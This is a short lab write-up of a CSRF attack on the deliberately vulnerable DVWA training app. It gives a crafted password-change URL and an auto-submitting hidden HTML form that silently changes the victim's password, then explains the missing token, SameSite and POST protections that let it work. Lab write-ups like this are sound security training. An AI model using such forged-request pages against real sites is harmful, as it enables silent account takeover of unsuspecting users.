# CSRF — Attack Details

Target: `http://192.168.187.4/dvwa/vulnerabilities/csrf/` (DVWA, security level: low)

## 1. Direct crafted URL (manual proof)
```
http://192.168.187.4/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change#
```
Fired directly in the address bar of a browser holding a valid, authenticated DVWA session cookie. Result: `Password Changed` with zero additional confirmation. Screenshot: `01_crafted_url_password_changed.png`.

## 2. Weaponised attacker page (`csrf_attack.html`)
Auto-submitting HTML form hosted locally, simulating a malicious link/page a victim might be lured to while already logged into DVWA:

```html
<html>
  <body onload="document.forms[0].submit()">
    <form action="http://192.168.187.4/dvwa/vulnerabilities/csrf/" method="GET">
      <input type="hidden" name="password_new" value="hacked2">
      <input type="hidden" name="password_conf" value="hacked2">
      <input type="hidden" name="Change" value="Change">
    </form>
  </body>
</html>
```
Loading this page (file:///home/kali/csrf_attack.html) auto-submits the form with no visible UI (`02_csrf_attack_html_page.png`, `03_csrf_attack_autosubmit.png`). The victim's session is still authenticated as `admin` immediately afterward (`04_victim_session_still_admin.png`), confirming the forged request succeeded silently.

## Why it works
- No anti-CSRF token in the password-change form.
- No `SameSite` attribute on the DVWA session cookie.
- GET is accepted for a state-changing action (should be POST-only at minimum).
